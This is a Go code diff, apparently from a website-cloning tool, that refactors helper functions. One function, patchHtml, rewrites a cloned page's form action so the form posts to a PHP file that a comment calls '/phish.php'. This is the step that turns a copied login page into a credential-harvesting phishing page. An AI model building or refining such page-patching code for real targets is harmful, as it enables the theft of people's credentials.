@@ -25,10 +25,7 @@ by @andpalmier
 // mkdirIfNotExist creates a directory if it does not exist
 func mkdirIfNotExist(dir string) error {
 	if _, err := os.Stat(dir); os.IsNotExist(err) {
-		err = os.MkdirAll(dir, 0755)
-		if err != nil {
-			return err
-		}
+		return os.MkdirAll(dir, 0755)
 	}
 	return nil
 }
@@ -42,26 +39,24 @@ func patchHtml(destFolder string, remotePaths []string, localPaths []string, php
 		return err
 	}
 
-	newContents := []byte(read)
+	newContents := read
 
 	// Replace remote paths with local paths
 	for i, remotePath := range remotePaths {
-		newContents = bytes.Replace(newContents, []byte(remotePath), []byte(localPaths[i]), -1)
+		newContents = bytes.ReplaceAll(newContents, []byte(remotePath), []byte(localPaths[i]))
 	}
 
 	// Find action attribute of the POST
-	r, _ := regexp.Compile(`(action=".*?")`)
-	m := r.FindAllStringSubmatch(string(newContents), -1)
+	r := regexp.MustCompile(`(action=".*?")`)
+	m := r.FindStringSubmatch(string(newContents))
 
 	// Replace action attribute of the POST with /phish.php
-	newContents = bytes.Replace(newContents, []byte(m[0][0]), []byte(fmt.Sprintf(`action="/%s"`, phpFilename)), -1)
+	if len(m) > 0 {
+		newContents = bytes.ReplaceAll(newContents, []byte(m[0]), []byte(fmt.Sprintf(`action="/%s"`, phpFilename)))
+	}
 
 	// Write patched html in destination
-	err = os.WriteFile(filePath, newContents, 0)
-	if err != nil {
-		return err
-	}
-	return nil
+	return os.WriteFile(filePath, newContents, 0644)
 }
 
 // stringInSlice (slice, string): return true if string is found in slice -> used to avoid duplicates
